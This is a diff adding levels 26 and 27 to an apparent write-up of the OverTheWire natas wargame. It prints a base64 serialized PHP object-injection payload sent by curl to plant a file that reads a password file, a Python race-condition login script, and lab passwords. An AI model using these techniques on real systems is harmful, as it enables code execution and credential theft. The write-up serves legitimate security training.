@@ -172,6 +172,7 @@ But we can use the path below to read the log file. After replacement, ```..././
 
 ```php
 <?php
+// http://natas25.natas.labs.overthewire.org/index-source.html
 function logRequest($message){
     $log="[". date("d.m.Y H::i:s",time()) ."]";
     $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
@@ -193,4 +194,128 @@ Then read the log file again.
 
 ```
 [11.08.2016 07::47:57] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T "Directory traversal attempt! fixing request."
+```
+
+## level 26
+
+The level is about [php object injection](https://www.owasp.org/index.php/PHP_Object_Injection).
+
+```php
+<?php
+// http://natas26.natas.labs.overthewire.org/index-source.html
+function storeData(){
+    $new_object=array();
+
+    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+        $new_object["x1"]=$_GET["x1"];
+        $new_object["y1"]=$_GET["y1"];
+        $new_object["x2"]=$_GET["x2"];
+        $new_object["y2"]=$_GET["y2"];
+    }
+
+    if (array_key_exists("drawing", $_COOKIE)){
+        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+    }
+    else{
+        // create new array
+        $drawing=array();
+    }
+
+    $drawing[]=$new_object;
+    setcookie("drawing",base64_encode(serialize($drawing)));
+}
+?>
+```
+
+This level allows me to inject codes via cookie.
+
+Let's create a new object.
+
+```php
+<?php
+class Logger{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    function __construct($file){
+        $this->initMsg="";
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27') ?>";
+        $this->logFile = "img/ving.php";
+    }
+    function log($msg){
+        ;
+    }
+    function __destruct(){
+        ;
+    }
+}
+$new_object = new Logger("hello");
+echo base64_encode(serialize($new_object));
+?>
+```
+
+```
+$ curl -u natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/ -b 'drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3ZpbmcucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MDoiIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjE6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3JykgPz4iO30='
+```
+
+We steal the password successfully.
+
+```
+$ curl -u natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/img/ving.php
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+```
+
+## level 27
+
+```php
+<?php
+// http://natas27.natas.labs.overthewire.org/index-source.html
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysql_real_escape_string($usr);
+    $password=mysql_real_escape_string($pass);
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysql_query($query, $link);
+    if(mysql_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+?>
+```
+
+```mysql_real_escape_string``` makes SQL injection really difficult.
+
+The trick to beating this level is in the comments at the top of the page.
+
+```
+// database gets cleared every 5 min
+```
+
+We can do this by spamming login attempts to the server and if we post at the exact moment where the database gets cleared but the natas28 user is not automatically added yet, we can create our own natas28 user.
+It seems the database clearing and creation of the natas28 user is not in one transaction but has some delay between them.
+
+```python
+#!/usr/bin/env python3
+import requests
+
+params = {'username': 'natas28', 'password': ''}
+auth = ('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')
+while True:
+    r = requests.get('http://natas27.natas.labs.overthewire.org/', params = params, auth = auth)
+    if 'Here' in r.text:
+        print(r.text)
+        break
+```
+
+```
+Welcome natas28!
+Here is your data:
+Array
+(
+    [username] => natas28
+    [password] => JWwR438wkgTsNKBbcJoowyysdM82YjeF
+)
 ```
